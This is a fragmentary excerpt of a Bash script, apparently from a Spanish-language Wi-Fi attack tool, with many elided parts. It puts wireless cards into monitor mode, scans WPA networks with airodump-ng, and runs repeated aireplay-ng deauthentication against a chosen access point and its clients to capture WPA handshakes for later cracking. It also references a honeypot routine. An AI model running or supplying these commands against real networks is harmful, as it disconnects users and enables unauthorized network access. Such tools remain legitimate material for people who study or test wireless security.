...
# wpaclean "handshake/$essid"_"$bssidseparado.cap" "redes/$essid"_"$bssidseparado-01.cap" > /dev/null 2>&1
...
;;
*)
echo -e $rojo" ERROR: option not valid"
HONEYPOT   
;;
esac
}
...
$azul   Select an Interface:  $amarillo")
...
if [ "$( wc -l < /tmp/interfaces.txt )" = '0' ]
  ...
  then
    echo ""
    echo -e $magenta" ════════════════════════════════════════════════════════════"
    echo -e $verde  "                   Activating modo monitor"
    echo -e $magenta" ════════════════════════════════════════════════════════════"
    echo ""
  ...
  for i in ${!PHY[*]} ;                                                    # This why we used a trasnitional file was use, to have a nicer display
   ...
   if [ -z "$(echo $intmon | grep mon)" ]
     then
       echo ""
       echo -e $magenta" ════════════════════════════════════════════════════════════"
       echo -e $verde"           Activating "$amarillo""$intmon""$verde" in monitor mode"
       echo -e $magenta" ════════════════════════════════════════════════════════════"
       echo "" 
...
echo ""
sleep 2
xterm -geometry 130x43+0+0 -e airodump-ng --encrypt WPA -w ./redes/Redes $intmon  
...
########################################Capturar Trafico##########################################################
SNIFF(){
xterm -geometry 130x43+0+0 -e airodump-ng --bssid $bssid -c $CANAL,$CANAL -w "redes/$essid"_"$bssidseparado" $intmon
}
SNIFF1(){
xterm -geometry 130x43+0+0 -e airodump-ng --bssid $bssid -c $CANAL,$CANAL -w "redes/$essid"_"$bssidseparado" $intmon
...
CALCULANUM(){
NUM=`ls -1 redes/"$essid"_"$bssidseparado"-*.cap | wc -l`
if [ $NUM -lt 10 ]; then
CERO="0"
else
CERO=""
...
CSV(){
counter=1
ls redes/"$essid"_"$bssidseparado"-01.csv > /dev/null 2>&1
while [ ! $? -eq 0 ]; do
echo -e ""$azul".\c"
sleep 0.2
counter=$((counter+1))
...
xterm -geometry 132x35-0-0 -fg yellow -e aireplay-ng -R --ignore-negative-one -0 15 -a $bssid -c $hay $intmon
CONT=$((CONT+1))
done
CONT=$intervalo
while [ $CONT -ge 1 ]; do
...
echo -e $amarillo"║  "$azul"                "$rojo" MOD SKN                   "$amarillo"║"
echo -e "╚═════════════════════════════════════════════╝"
sleep 3
clear 
SELECT
...
#################################################Poner in monitor mode################################################
MONITORUP(){ 
airmon-ng start $intrfz > /dev/null 2>&1
ifconfig mon0 > /dev/null 2>&1
echo ""
echo -e $magenta" ════════════════════════════════════════════════════════════"
echo -e $verde"           Activating "$amarillo""$intrfz""$verde" in monitor mode"
echo -e $magenta" ════════════════════════════════════════════════════════════"
echo ""
sleep 2
if [ $? = 0 ]; then
